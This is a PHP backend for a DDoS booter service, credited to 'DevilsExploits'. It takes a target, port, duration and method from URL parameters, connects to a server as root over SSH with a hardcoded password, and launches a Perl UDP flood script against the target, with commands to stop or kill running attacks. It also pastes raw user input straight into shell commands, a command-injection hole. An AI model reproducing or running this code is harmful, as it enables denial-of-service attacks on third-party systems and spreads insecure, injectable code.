<?php

//API Script by DevilsExploits

ignore_user_abort(true);

set_time_limit(0);



$server_ip = "localhost"; //Usally localhost but u may put your Server IP

$server_pass = "devils420x"; //root password

$server_user = "root"; //root user usally "root"



// End API Keys



$host = $_GET['target'];

$time = $_GET['time'];

$method = strtoupper($_GET['method']);

$action = $_GET['action'];

$user = $_GET['username'];

$port = $_GET['port'];





if ($action == "ON") {



if ($method == "UDP") { exec("screen -dmS $user"); $command = "screen -dmS $user perl ddos.pl $host $port 1024 $time"; }
if ($method == "VPN") { exec("screen -dmS $user"); $command = "screen -dmS $user perl ddos.pl $host $port 6096 $time"; }


if(!$port && !$time)

		{

			echo "Attack Sent to $host using method $method -User ID: $user";

		}

	if(isset($time))

		{

			echo "Attack Sent to $host on port $port for $time seconds using method $method -User ID: $user";

		}

					}



if ($action == "OFF") {

$command = "screen -s $user -X quit";

echo "All attacks stopped with User ID $user";

 }

if ($action == "SAVE") {

$command = "killall screen";

echo "You have killed all running attacks.";

 }

if (!function_exists("ssh2_connect")) die("Function ssh2_connect doesn't exist");

if(!($con = ssh2_connect($server_ip, 22))){

  echo "Error: Connection Issue (Wrong Port? Server been Shutdown?)";

} else {

  

    if(!ssh2_auth_password($con, $server_user, $server_pass)) {

	echo "Error: Bad Login (Please check the Login and Try again)";

    } else {

	

        if (!($stream = ssh2_exec($con, $command ))) {

            echo "Error: Unable to Execute Command\n";

        } else {

       

            stream_set_blocking($stream, true);

            $data = "";

            while ($buf = fread($stream,4096)) {

                $data .= $buf;

            }

            fclose($stream);

        }

    }

}

?>
